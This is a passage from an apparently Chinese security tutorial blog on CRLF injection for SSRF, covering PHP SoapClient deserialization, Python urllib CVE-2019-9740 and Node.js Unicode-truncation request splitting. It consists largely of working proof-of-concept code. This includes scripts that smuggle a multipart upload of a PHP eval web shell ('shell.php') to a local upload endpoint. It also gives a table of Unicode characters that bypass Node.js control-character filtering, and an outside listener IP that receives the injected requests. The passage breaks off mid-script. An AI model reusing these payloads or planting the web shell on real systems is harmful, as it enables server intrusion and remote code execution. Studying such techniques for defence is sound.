部分与 HTTP Body 部分是用两个CRLF分隔的，所以我们要发送 POST 数据就要插入两个CRLF。<br>对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。</li></ul><p>测试代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;&#39;;</span><br><span class="line">$post_data &#x3D; &#39;data&#x3D;whoami&#39;;</span><br><span class="line">$headers &#x3D; array(</span><br><span class="line">    &#39;X-Forwarded-For: 127.0.0.1&#39;,</span><br><span class="line">    &#39;Cookie: PHPSESSID&#x3D;3stu05dr969ogmprk28drnju93&#39;</span><br><span class="line">);</span><br><span class="line">$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,&#39;user_agent&#39;&#x3D;&gt;&#39;WHOAMI^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_data).&#39;^^^^&#39;.$post_data,&#39;uri&#39;&#x3D;&gt;&#39;test&#39;));</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">$b &#x3D; str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$b);</span><br><span class="line">echo $b;</span><br><span class="line">$c &#x3D; unserialize($b);</span><br><span class="line">$c-&gt;a();    &#x2F;&#x2F; 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>VPS 上监听到了 POST 数据：<br><img src="/images/pasted-38.png" alt="upload successful"></p></li></ul></li><li><p><strong><font color=#ff4500>Python urllib CRLF 注入漏洞（CVE-2019-9740）</font></strong></p><ul><li><p>Python是一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。urllib是其中的一个用于处理URL的模块。urllib2是其中的一个用于获取URL（统一资源定位符）的模块。<br>Python 2.x版本至2.7.16版本中的urllib2和Python 3.x版本至3.7.2版本中的urllib存在注入漏洞。该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。<br>该漏洞早在2016年就被爆出（CVE-2016-5699），在之后的一段时间里不断爆出了python其他版本也存在该漏洞（CVE-2019-9740、CVE-2019-9947）。</p></li><li><p><strong>影响范围：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Python 2.x版本至2.7.16版本中的urllib2</span><br><span class="line">Python 3.x版本至3.7.2版本中的urllib</span><br></pre></td></tr></table></figure><p>在 HTTP 状态行注入恶意首部字段<br>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\nCRLF-injection: True\r\nSet-Cookie: PHPSESSID&#x3D;whoami&quot;</span><br><span class="line">#?a&#x3D;1 后面的那个HTTP&#x2F;1.1是为了闭合正常的HTTP状态行</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>执行代码后，VPS 上会监听到如下HTTP头：成功进行了CRLF注入<br><img src="/images/pasted-39.png" alt="upload successful"><br>如果是使用不存在漏洞的版本进行请求，则会直接进行报错<br><img src="/images/pasted-40.png" alt="upload successful"></p></li><li><p><strong>在 HTTP 状态行注入完整 HTTP 请求</strong><br>由于 Python Urllib 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 和 Host 字段影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。</p><ul><li>场景一，目标主机存在SSRF漏洞，且存在上传漏洞，但是上传点限制了只允许本机进行上传。<br>完整的上传请求如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>编写脚本构造payload：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 435</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[whoami]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\\r\\n&quot;)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">#输出: HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:</span><br></pre></td></tr></table></figure>构造完整的请求<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import urllib</span><br><span class="line">import urllib.request</span><br><span class="line">import urllib.error</span><br><span class="line"></span><br><span class="line">#url &#x3D; &quot;http:&#x2F;&#x2F;47.101.57.72:4000</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;47.101.57.72:4000?a&#x3D;1 HTTP&#x2F;1.1\r\n\r\nPOST &#x2F;upload.php HTTP&#x2F;1.1\r\nHost: 127.0.0.1\r\nContent-Length: 435\r\nContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36\r\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q&#x3D;0.9\r\nCookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4\r\nConnection: close\r\n\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;\r\n\r\n100000\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;\r\nContent-Type: application&#x2F;octet-stream\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\r\nContent-Disposition: form-data; name&#x3D;&quot;Upload&quot;\r\n\r\nUpload\r\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\r\n\r\nGET &#x2F; HTTP&#x2F;1.1\r\ntest:&#39;</span><br><span class="line">#?a&#x3D;1 后面的那个HTTP&#x2F;1.1是为了闭合正常的HTTP状态行</span><br><span class="line">try:</span><br><span class="line">    info &#x3D; urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"></span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>如此目标主机就成功的向本地上传功能发送了一个上传请求<br><img src="/images/pasted-41.png" alt="upload successful"></li></ul></li></ul></li></ol><p><strong>4. <font color=#ff4500>NodeJS 中的 CRLF Injection</font></strong></p><ul><li>背景<br>2018 年有研究者发现，当Node.js使用 http.get 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！<br><img src="/images/pasted-42.png" alt="upload successful"><br>深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时，对Unicode字符的有损编码引起的。</li><li><strong>HTTP 请求路径中的 Unicode 字符损坏</strong><br>虽然用户发出的 HTTP 请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如 \u0130 就会被截断为 \u30：<br><img src="/images/pasted-43.png" alt="upload successful"></li><li><strong>Unicode 字符损坏造成的 HTTP 拆分攻击</strong><br>刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。<br>由于nodejs的HTTP库包含了阻止CRLF的措施，即如果你尝试发出一个URL路径中含有回车、换行或空格等控制字符的HTTP请求是，它们会被URL编码，所以正常的CRLF注入在nodejs中并不能利用：<br><font color=#FF0000>例如使用正常的CRLF注入并不能成功</font><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; var http &#x3D; require(&quot;http&quot;);</span><br><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;%0D%0A&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure><img src="/images/pasted-44.png" alt="upload successful"><br>但是上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;</span><br><span class="line">http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;čĊ&#x2F;WHOAMI</span><br></pre></td></tr></table></figure>当 Node.js v8 或更低版本对此URL发出 GET 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u010D\u010A&#x2F;WHOAMI&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;čĊ&#x2F;WHOAMI HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure>但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Buffer.from(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u&#123;010D&#125;\u&#123;010A&#125;&#x2F;WHOAMI&#39;, &#39;latin1&#39;).toString()</span><br><span class="line">&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\r\n&#x2F;WHOAMI&#39;</span><br></pre></td></tr></table></figure><img src="/images/pasted-45.png" alt="upload successful"><br>可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。<br>不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字符可由以下Unicode编码构造出Unicode编码对应的字符Unicode编码对应的字符对应的URL编码</span><br><span class="line">回车符 \r   \u010d   č   %C4%8D</span><br><span class="line">换行符 \n   \u010a   Ċ   %C4%8A</span><br><span class="line">空格          \u0120    Ġ   %C4%A0</span><br><span class="line">反斜杠 \      \u0122     Ģ   %C4%A2</span><br><span class="line">单引号 &#39;       \u0127      ħ   %C4%A7</span><br><span class="line">反引号 &#96;      \u0160     Š   %C5%A0</span><br><span class="line">叹号 !       \u0121    ġ   %C4%A1</span><br></pre></td></tr></table></figure>这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8 或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">接受来自用户输入的Unicode数据</span><br><span class="line">并将其包含在HTTP请求的路径中</span><br><span class="line">且请求具有一个0长度的主体（比如一个 GET 或者 DELETE）</span><br></pre></td></tr></table></figure></li><li><strong>在 HTTP 状态行注入恶意首部字段</strong><br>  由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;ĠHTTP&#x2F;1.1čĊSet-Cookie:ĠPHPSESSID&#x3D;whoami HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure><img src="/images/pasted-46.png" alt="upload successful"><br>如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 HTTP/1.1 ，但我们根据该原理依然可以将其闭合：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.get(&#39;http:&#x2F;&#x2F;47.101.57.72:4000&#x2F;\u0120HTTP&#x2F;1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID&#x3D;whoami\u010D\u010Atest:&#39;).output</span><br><span class="line">[ &#39;GET &#x2F;ĠHTTP&#x2F;1.1čĊSet-Cookie:ĠPHPSESSID&#x3D;whoamičĊtest: HTTP&#x2F;1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#39; ]</span><br></pre></td></tr></table></figure><img src="/images/pasted-47.png" alt="upload successful"><br>这样，我们便可以构造 “任意” 的HTTP请求了。</li><li><strong>在 HTTP 状态行注入完整 HTTP 请求</strong><br>  首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 HTTP/1.1 ，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 HTTP/1.1 影响我们新构造的请求，我们还需要再构造一次 GET / 闭合原来的 HTTP 请求。<br>假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br></pre></td></tr></table></figure>为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：<br>程序编码实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">POST &#x2F;upload.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 437</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.72 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;nk67astv61hqanskkddslkgst4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span><br><span class="line"></span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)</span><br><span class="line"></span><br><span class="line">def payload_encode(raw):</span><br><span class="line">    ret &#x3D; u&quot;&quot;</span><br><span class="line">    for i in raw:</span><br><span class="line">        ret +&#x3D; 